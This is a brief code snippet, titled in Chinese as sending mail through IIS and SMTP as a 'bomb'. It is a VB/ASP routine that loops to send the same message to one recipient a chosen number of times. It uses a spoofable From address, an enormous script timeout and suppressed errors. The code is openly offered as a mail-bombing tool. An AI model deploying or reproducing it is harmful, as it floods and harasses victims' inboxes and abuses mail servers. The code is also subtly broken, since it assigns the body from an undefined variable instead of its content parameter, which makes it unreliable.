# [VB]使用IIS&SMTP发送邮件(炸弹)

```vb
Private Sub SendMails(lngTimes As Long, _
strFrom As String, _
strTo As String, _
strSubject As String, _
strContent As String)

On Error Resume Next

Dim lngIndex As Long

Dim objMail As Object

Server.ScriptTimeOut = 100000000

For lngIndex = 1 To lngTimes

Set objMail = Server.CreateObject("CDONTS.NewMail")

With objMail
.To = strTo
.From = strFrom
.Subject = strSubject
.MailFormat = 0
.BodyFormat = 0
.Body = strBody
.Send
End With

Set objMail = Nothing

Next

End Sub
```

